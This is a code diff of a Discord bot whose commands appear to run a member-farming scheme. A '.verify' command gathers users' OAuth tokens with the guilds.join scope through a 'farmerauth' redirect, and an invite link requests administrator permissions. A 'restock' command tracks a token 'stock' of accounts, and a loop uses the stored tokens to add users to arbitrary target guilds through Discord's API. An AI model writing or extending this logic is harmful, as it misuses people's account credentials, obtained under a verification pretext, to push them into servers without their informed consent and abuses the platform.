@@ -97,7 +97,7 @@ app.get('/', async (req, res) => {
                                 .setColor(0x00FF00)
                                 .setTimestamp();
 
-                            const sentMessage = await announcementChannel.content ? await announcementChannel.send({ content: '@everyone', embeds: [restockEmbed] }) : await announcementChannel.send({ content: '@everyone', embeds: [restockEmbed] });
+                            const sentMessage = await announcementChannel.send({ content: '@everyone', embeds: [restockEmbed] });
                             await sentMessage.react('☑️');
                         }
                     } catch (announcementErr) {
@@ -188,9 +188,9 @@ client.on('messageCreate', async message => {
         return message.reply({ embeds: [helpEmbed] });
     }
 
-    // 2. .bot / .invite Command
+    // 2. .bot / .invite Command (Sends only button with custom link, no embed)
     if (command === 'bot' || command === 'invite') {
-        const inviteUrl = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.com%2Fchannels%2F1561434965395116182%2F1561439510540066866&integration_type=0&scope=guilds.join+bot+applications.commands';
+        const inviteUrl = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.com%2Fchannels%2F1561434965395116182%2F1561453186810642522&integration_type=0&scope=bot+guilds.join+identify+applications.commands';
 
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder()
@@ -202,7 +202,7 @@ client.on('messageCreate', async message => {
         return message.reply({ components: [row] });
     }
 
-    // 3. .verify / .link Command
+    // 3. .verify / .link Command (Scope: identify + guilds.join)
     if (command === 'verify' || command === 'link') {
         const clientId = process.env.CLIENT_ID || '1561438987464483048';
         const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app';
@@ -232,7 +232,7 @@ client.on('messageCreate', async message => {
     if (command === 'restock') {
         const amount = parseInt(args[0]);
         if (isNaN(amount)) return message.reply(`Usage: \`${currentPrefix}restock <amount>\``);
-        tokenDatabase.push(...Array(amount).fill({ mock: true })); // Adds mock slots for manual restocks
+        tokenDatabase.push(...Array(amount).fill({ mock: true })); 
         return message.reply(`✅ Successfully restocked **${amount}** accounts manually. Total stock: \`${tokenDatabase.length}\`.`);
     }
 
@@ -278,7 +278,7 @@ client.on('messageCreate', async message => {
 
         let successCount = 0;
         for (const tokenData of tokensToUse) {
-            if (tokenData.mock) continue; // Skip mock tokens if added manually via command
+            if (tokenData.mock) continue; 
             try {
                 const joinRes = await fetch(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, {
                     method: 'PUT',
